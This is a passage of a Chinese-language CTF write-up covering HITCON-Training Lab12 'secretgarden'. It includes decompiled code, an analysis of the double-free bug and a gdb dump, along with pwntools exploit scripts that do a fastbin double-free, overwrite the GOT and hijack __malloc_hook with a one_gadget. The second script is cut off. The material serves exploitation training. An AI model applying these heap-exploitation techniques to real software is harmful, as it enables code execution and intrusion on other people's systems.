p64(one_gadget + libc.address)</span><br><span class=\"line\">edit(<span class=\"number\">0</span>, len(payload), payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">\"any\"</span>)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"Lab12——secretgarden\"><a href=\"#Lab12——secretgarden\" class=\"headerlink\" title=\"Lab12——secretgarden\"></a>Lab12——secretgarden</h2><h3 id=\"防护-2\"><a href=\"#防护-2\" class=\"headerlink\" title=\"防护\"></a>防护</h3><p>和Lab11类似，也没有开启pie。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab12$ checksec secretgarden</span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/HITCON-Training/LAB/lab12/secretgarden&apos;</span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>\n<h3 id=\"分析-2\"><a href=\"#分析-2\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>主要功能有add, visit, del和clean。</p>\n<h4 id=\"add\"><a href=\"#add\" class=\"headerlink\" title=\"add\"></a>add</h4><p>这里我们通过逆向得到flower结构体的结构为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">struct flower&#123;</span><br><span class=\"line\">\t+0x0 DWORD inuse; // 初始化之后会置为1</span><br><span class=\"line\">  +0x8 char* name;</span><br><span class=\"line\">  +0x10 char[24] color; // 通过scanf（&quot;%23s&quot;）输入，说明至少为23位</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>add函数中，首先判断flowercount是否大于0x63，是则直接退出。然后malloc一个0x28的chunk，并均初始化为0。然后用scanf读入name的长度，这里检查长度size不为-1，防止整数溢出。然后malloc(size)的chunk，再读入name和color。最后会存储在flowerlist上，并将flowercount自增1</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">add</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">void</span> *v0; <span class=\"comment\">// rsi</span></span><br><span class=\"line\">  <span class=\"keyword\">size_t</span> size; <span class=\"comment\">// [rsp+0h] [rbp-20h]</span></span><br><span class=\"line\">  <span class=\"keyword\">void</span> *s; <span class=\"comment\">// [rsp+8h] [rbp-18h]</span></span><br><span class=\"line\">  <span class=\"keyword\">void</span> *buf; <span class=\"comment\">// [rsp+10h] [rbp-10h]</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> __int64 v5; <span class=\"comment\">// [rsp+18h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v5 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  s = <span class=\"number\">0L</span>L;</span><br><span class=\"line\">  buf = <span class=\"number\">0L</span>L;</span><br><span class=\"line\">  LODWORD(size) = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span>)flowercount &gt; <span class=\"number\">0x63</span> )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">\"The garden is overflow\"</span>);</span><br><span class=\"line\">  s = <span class=\"built_in\">malloc</span>(<span class=\"number\">0x28</span>uLL);</span><br><span class=\"line\">  <span class=\"built_in\">memset</span>(s, <span class=\"number\">0</span>, <span class=\"number\">0x28</span>uLL);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"Length of the name :\"</span>, <span class=\"number\">0L</span>L, size);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span>)__isoc99_scanf(<span class=\"string\">\"%u\"</span>, &amp;size) == <span class=\"number\">-1</span> )</span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">-1</span>);</span><br><span class=\"line\">  buf = <span class=\"built_in\">malloc</span>((<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span>)size);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !buf )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"Alloca error !!\"</span>);</span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">-1</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"The name of flower :\"</span>, size);</span><br><span class=\"line\">  v0 = buf;</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, buf, (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span>)size);</span><br><span class=\"line\">  *((_QWORD *)s + <span class=\"number\">1</span>) = buf;</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"The color of the flower :\"</span>, v0, size);</span><br><span class=\"line\">  __isoc99_scanf(<span class=\"string\">\"%23s\"</span>, (<span class=\"keyword\">char</span> *)s + <span class=\"number\">16</span>);</span><br><span class=\"line\">  *(_DWORD *)s = <span class=\"number\">1</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( HIDWORD(size) = <span class=\"number\">0</span>; HIDWORD(size) &lt;= <span class=\"number\">0x63</span>; ++HIDWORD(size) )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( !*(&amp;flowerlist + HIDWORD(size)) )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      *(&amp;flowerlist + HIDWORD(size)) = s;</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  ++flowercount;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">\"Successful !\"</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"del\"><a href=\"#del\" class=\"headerlink\" title=\"del\"></a>del</h4><p>会根据输入的index，将对应flowerlist中的flower结构体的inuse置为0，然后free掉name的chunk，注意这里存在uaf漏洞，而且没有free flower结构体堆块</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">del</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> result; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> v1; <span class=\"comment\">// [rsp+4h] [rbp-Ch]</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> __int64 v2; <span class=\"comment\">// [rsp+8h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v2 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !flowercount )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">\"No flower in the garden\"</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"Which flower do you want to remove from the garden:\"</span>);</span><br><span class=\"line\">  __isoc99_scanf(<span class=\"string\">\"%d\"</span>, &amp;v1);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v1 &lt;= <span class=\"number\">0x63</span> &amp;&amp; *(&amp;flowerlist + v1) )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    *(_DWORD *)*(&amp;flowerlist + v1) = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(*((<span class=\"keyword\">void</span> **)*(&amp;flowerlist + v1) + <span class=\"number\">1</span>));</span><br><span class=\"line\">    result = <span class=\"built_in\">puts</span>(<span class=\"string\">\"Successful\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"Invalid choice\"</span>);</span><br><span class=\"line\">    result = <span class=\"number\">0</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"clean\"><a href=\"#clean\" class=\"headerlink\" title=\"clean\"></a>clean</h4><p>判断对应flower的chunk不为null且inuse标记为0，就free掉flower结构体，然后将flowercount自减1。也就是说，这个函数没有free flower的name的堆块。理论上应该先调用del，再调用clean。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">clean</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> i; <span class=\"comment\">// [rsp+Ch] [rbp-4h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt;= <span class=\"number\">0x63</span>; ++i )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( *(&amp;flowerlist + i) &amp;&amp; !*(_DWORD *)*(&amp;flowerlist + i) )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">free</span>(*(&amp;flowerlist + i));</span><br><span class=\"line\">      *(&amp;flowerlist + i) = <span class=\"number\">0L</span>L;</span><br><span class=\"line\">      --flowercount;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">\"Done!\"</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"visit\"><a href=\"#visit\" class=\"headerlink\" title=\"visit\"></a>visit</h4><p>根据对应flowerlist上对应chunk的inuse位，若inuse位不为0，则输出name和color。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">visit</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  __int64 v0; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> i; <span class=\"comment\">// [rsp+Ch] [rbp-4h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  LODWORD(v0) = flowercount;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( flowercount )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt;= <span class=\"number\">0x63</span>; ++i )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      v0 = (__int64)*(&amp;flowerlist + i);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( v0 )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        LODWORD(v0) = *(_DWORD *)*(&amp;flowerlist + i);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( (_DWORD)v0 )</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          <span class=\"built_in\">printf</span>(<span class=\"string\">\"Name of the flower[%u] :%s\\n\"</span>, i, *((_QWORD *)*(&amp;flowerlist + i) + <span class=\"number\">1</span>));</span><br><span class=\"line\">          LODWORD(v0) = <span class=\"built_in\">printf</span>(<span class=\"string\">\"Color of the flower[%u] :%s\\n\"</span>, i, (<span class=\"keyword\">char</span> *)*(&amp;flowerlist + i) + <span class=\"number\">16</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    LODWORD(v0) = <span class=\"built_in\">puts</span>(<span class=\"string\">\"No flower in the garden !\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> v0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"利用-2\"><a href=\"#利用-2\" class=\"headerlink\" title=\"利用\"></a>利用</h3><p>该题目程序功能比较复杂，但是主要漏洞在于对堆块是否被释放的管理逻辑有误。del函数会将指定index的chunk的<em>inuse置0</em>，并且将对应的name chunk free掉，但是没有free 指定index的chunk本身。clean函数会将所有inuse位不为0且不为null的chunk free掉。而visit函数会根据inuse位是否为1来决定是否输出对应信息。</p>\n<p>注意，该题由于没有setvbuf，所以需要先调用一次add函数将缓冲区申请出来。</p>\n<p>注意到，该题在调用del之后，如果不调用clean，将不会从全局数组上删除对应chunk指针，所以存在潜在的double free漏洞。在此构造一个fastbin 2free，实现任意地址分配。</p>\n<p>一般来说，通过inuse这种方式判断是否可以free是不安全的，一般都可能存在2free漏洞。</p>\n<p>这里要实现任意地址分配，需要控制size。我们需要在想改的got表覆盖找一个地址，size在fastbin范围内，在got表前面一个byte一个byte的查看字节偏移，找到0x601fffa为合适的地址</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gef➤  x/32gx 0x601ffa</span><br><span class=\"line\">0x601ffa:\t0x1e28000000000000\t0x0168000000000060</span><br><span class=\"line\">0x60200a:\t0x0ee000007fd5662b\t0x34f000007fd5660a</span><br><span class=\"line\">0x60201a &lt;free@got.plt+2&gt;:\t0xe69000007fd565d4\t0x07b600007fd565d2</span><br><span class=\"line\">0x60202a &lt;__stack_chk_fail@got.plt+2&gt;:\t0x4800000000000040\t0x197000007fd565d1</span><br><span class=\"line\">0x60203a &lt;memset@got.plt+2&gt;:\t0xb20000007fd565e3\t0x68e000007fd565d8</span><br><span class=\"line\">0x60204a &lt;close@got.plt+2&gt;:\t0x625000007fd565db\t0xf74000007fd565db</span><br><span class=\"line\">0x60205a &lt;__libc_start_main@got.plt+2&gt;:\t0x43c000007fd565cd\t0x313000007fd565cf</span><br><span class=\"line\">0x60206a &lt;malloc@got.plt+2&gt;:\t0xee7000007fd565d4\t0x603000007fd565d2</span><br><span class=\"line\">0x60207a &lt;open@got.plt+2&gt;:\t0x5e8000007fd565db\t0xa4d000007fd565cf</span><br><span class=\"line\">0x60208a &lt;__isoc99_scanf@got.plt+2&gt;:\t0x088600007fd565d2\t0x0000000000000040</span><br><span class=\"line\">0x60209a:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x6020aa:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x6020ba:\t0x4620000000000000\t0x000000007fd56608</span><br><span class=\"line\">0x6020ca:\t0x0000000000030000\t0x0000000000000000</span><br><span class=\"line\">0x6020da:\t0x4010000000000000\t0x507000000000017f</span><br><span class=\"line\">0x6020ea &lt;flowerlist+10&gt;:\t0x50c000000000017f\t0x000000000000017f</span><br></pre></td></tr></table></figure>\n<p>由fastbin数组索引计算的宏定义可知，高四位不影响size的大小。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#define fastbin_index(sz) \\</span><br><span class=\"line\">\t((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span><br></pre></td></tr></table></figure>\n<p>在分配到该位置后，复写got表即可实现利用，exp如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># from LibcSearcher import *</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"/lib/x86_64-linux-gnu/libc.so.6\"</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./secretgarden\"</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">\"./secretgarden\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span><span class=\"params\">(size, name, color)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice : \"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"name :\"</span>)</span><br><span class=\"line\">\tp.sendline(str(size))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"flower :\"</span>)</span><br><span class=\"line\">\tp.send(name)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"flower :\"</span>)</span><br><span class=\"line\">\tp.sendline(color)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">visit</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice : \"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"2\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">del_</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice : \"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"3\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"garden:\"</span>)</span><br><span class=\"line\">\tp.sendline(str(index))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">clean</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice : \"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"4\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">magic = <span class=\"number\">0x400c7b</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x50</span>, <span class=\"string\">\"a\"</span>, <span class=\"string\">\"aaaa\"</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x50</span>, <span class=\"string\">\"b\"</span>, <span class=\"string\">\"bbbb\"</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x50</span>, <span class=\"string\">\"c\"</span>, <span class=\"string\">\"cccc\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 1-&gt;2-&gt;1</span></span><br><span class=\"line\">del_(<span class=\"number\">1</span>)</span><br><span class=\"line\">del_(<span class=\"number\">2</span>)</span><br><span class=\"line\">del_(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">addr = <span class=\"number\">0x601ffa</span></span><br><span class=\"line\">freegot = elf.got[<span class=\"string\">'free'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x50</span>, p64(addr), <span class=\"string\">\"fake\"</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x50</span>, <span class=\"string\">\"d\"</span>, <span class=\"string\">\"dddd\"</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x50</span>, <span class=\"string\">\"e\"</span>, <span class=\"string\">\"eeee\"</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x50</span>,<span class=\"string\">\"a\"</span>*<span class=\"number\">6</span> + p64(<span class=\"number\">0</span>) + p64(magic) * <span class=\"number\">2</span> ,<span class=\"string\">\"red\"</span>) <span class=\"comment\">#malloc in fake_chunk</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h3 id=\"提高-1\"><a href=\"#提高-1\" class=\"headerlink\" title=\"提高\"></a>提高</h3><h4 id=\"leak-libc\"><a href=\"#leak-libc\" class=\"headerlink\" title=\"leak libc\"></a>leak libc</h4><p>leak libc最简单的方法之一，就是使用unsorted bin攻击，将free后的unsorted bin，直接malloc，这不会改变其中泄漏出的libc地址。通过overlapping，或者修改inuse等辅助变量，也都可能实现leak libc。这里我们使用unsorted bin攻击直接leak libc。</p>\n<h4 id=\"劫持控制流\"><a href=\"#劫持控制流\" class=\"headerlink\" title=\"劫持控制流\"></a>劫持控制流</h4><p>我们通过复写<code>__malloc_hook</code>的got表即可实现利用，在libc上，<code>__malloc_hook</code>紧挨着main_arena（已经leak得到main_arena+0x88的地址）。我们仍然通过上述调整偏移的方法，寻找某个<code>__malloc_hook</code>之前合法的地址。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gef➤  x/32gx 0x7fdaa8a46af0 + 5 - 0x8</span><br><span class=\"line\">0x7fdaa8a46aed &lt;_IO_wide_data_0+301&gt;:\t0xdaa8a45260000000\t0x000000000000007f</span><br><span class=\"line\">0x7fdaa8a46afd:\t0xdaa8707e20000000\t0xdaa8707a0000007f</span><br><span class=\"line\">0x7fdaa8a46b0d &lt;__realloc_hook+5&gt;:\t0x000000000000007f\t0x0000000000000000</span><br><span class=\"line\">0x7fdaa8a46b1d:\t0x0000000000000000\t0x0000000000000000</span><br></pre></td></tr></table></figure>\n<p>可以看到，当分配到如下地址时，size正好为0x7f，即malloc(0x60)的chunk，然后我们将<code>__malloc_hook</code>覆盖为one_gadget即可。</p>\n<h4 id=\"触发-malloc-hook\"><a href=\"#触发-malloc-hook\" class=\"headerlink\" title=\"触发__malloc_hook\"></a>触发__malloc_hook</h4><p>这里如果我们直接调用add功能，而在malloc(0x28)时触发malloc_hook，会发现所有的one_gadget地址都不符合要求。这里我们有一个小trick，如果我们对同一个chunk free两次，触发对double free的报错，这时libc代码也会触发_malloc_hook。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 两次free同一个chunk，触发报错函数</span></span><br><span class=\"line\"><span class=\"comment\">// 而调用报错函数的时候又会用到malloc-hook，从而getshell</span></span><br><span class=\"line\"><span class=\"comment\">/* Another simple check: make sure the top of the bin is not the</span></span><br><span class=\"line\"><span class=\"comment\">       record we are going to add (i.e., double free).  */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (__builtin_expect (old == p, <span class=\"number\">0</span>))</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        errstr = <span class=\"string\">\"double free or corruption (fasttop)\"</span>;</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> errout;</span><br><span class=\"line\">\t\t\t&#125;</span><br></pre></td></tr></table></figure>\n<p>完整exp如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span 